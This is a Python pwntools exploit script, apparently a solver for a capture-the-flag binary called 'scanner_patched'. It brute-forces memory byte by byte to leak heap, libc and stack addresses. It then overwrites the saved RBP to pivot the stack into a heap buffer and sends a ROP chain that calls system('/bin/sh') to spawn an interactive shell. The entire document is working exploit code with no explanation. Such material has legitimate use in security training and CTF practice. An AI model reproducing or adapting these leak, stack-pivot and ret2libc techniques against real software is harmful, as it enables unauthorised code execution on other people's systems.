from pwn import *

elf = ELF("scanner_patched")
libc = ELF("libc.so.6")
script = """
continue
"""
p = process(elf.path)


info("Getting Leaks")
p.sendlineafter(b">", b"1")
p.sendlineafter(b"buffer: ", b"A" * 4095)
all_leaks = []
for j in range(41):
    for i in range(256):
        p.sendlineafter(b">", b"3")
        if j == 16:
            all_leaks[0] = b"\xc0"
        if j == 32:
            all_leaks[0] = b"\xf0"
        if j >= 8:
            payload = b"naive1 " + (str(len(all_leaks) + 2 + 8)).encode()
        else:
            payload = b"naive1 " + (str(len(all_leaks) + 2)).encode()
        p.sendlineafter(b"parameters:", payload)
        payload = b"\00"
        for x in range(len(all_leaks)):
            payload += all_leaks[x]
            if x == 7:
                payload += p64(len(all_leaks) + 2 + 8, endianness="little")
        payload += p8(i)
        p.recv(timeout=0.1)
        p.sendline(payload)
        resp = p.recvline()
        if b"Found at i" in resp:
            if j == 8:
                break
            info("Found byte 0x%x", i)
            info("Found at index %d", j)
            all_leaks.append(p8(i))
            break
heap_leak = b""
for i in range(0, 8):
    heap_leak += all_leaks[i]
heap_leak = u64(heap_leak)
info("Heap Pointer leak 0x%x", heap_leak)
heap_base = heap_leak - 0x2F0
info("Heap Base 0x%x", heap_base)
libc_leak = b""
for i in range(16, 24):
    libc_leak += all_leaks[i]
libc_leak = u64(libc_leak)
info("Libc Leak 0x%x", libc_leak)
libc.address = libc_leak - (libc.sym.__libc_start_main + 243)
info("LibC Base 0x%x", libc.address)
stack_leak = b""
for i in range(32, 40):
    stack_leak += all_leaks[i]
stack_leak = u64(stack_leak)
info("Stack Leak 0x%x", stack_leak)
buffer_start = stack_leak - 0x1108
info("Buffer start 0x%x", buffer_start)
original_rbp = stack_leak - 0xF8
info("Original RBP 0x%x", original_rbp)
new_rbp = original_rbp & 0xFFFFFFFFFFFFFF00
rbp_start = original_rbp & 0xFF
if rbp_start == 0:
    error("Can't overwrite with 00 if it ends with 00 already")
if rbp_start == 0x10:
    error("Some issue with RBP and menu option")
info("New RBP at 0x%x", new_rbp)


info("Stack Pivot")
malloc_1_pointer = heap_base + 0x2A0
offset = new_rbp - buffer_start
payload = (b"A" * (offset - 16)) + p64(malloc_1_pointer) + p64(0)
p.sendlineafter(b">", b"1")
p.sendlineafter(b"buffer: ", payload)
p.sendlineafter(b">", b"3")
payload = b"A" * 16 + b"1"
p.sendlineafter(b"parameters:", payload)
sleep(0.1)
p.sendline(b"1")


info("Overwritting fgets ret addr")
rop = ROP(libc.path)
pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh"))
nop = libc.address + 0x319BF
system = libc.sym.system
payload = p64(nop) * 508 + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendlineafter(b">", b"1")
p.sendlineafter(b"buffer: ", payload)

success("Shell")
p.interactive()
